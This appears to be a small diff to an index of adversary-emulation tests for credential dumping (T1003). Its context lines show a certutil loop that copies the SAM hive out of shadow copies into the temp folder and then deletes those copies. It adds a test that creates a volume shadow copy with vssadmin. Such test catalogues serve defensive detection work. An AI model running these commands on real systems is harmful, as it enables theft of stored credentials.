@@ -50,6 +50,10 @@ for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\Hard
 for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
 
 T1003.003.md
+
+## Atomic Test #1 - Create Volume Shadow Copy with vssadmin
+vssadmin.exe create shadow /for=C:
+
 T1003.004.md
 T1003.005.md
 T1003.006.md
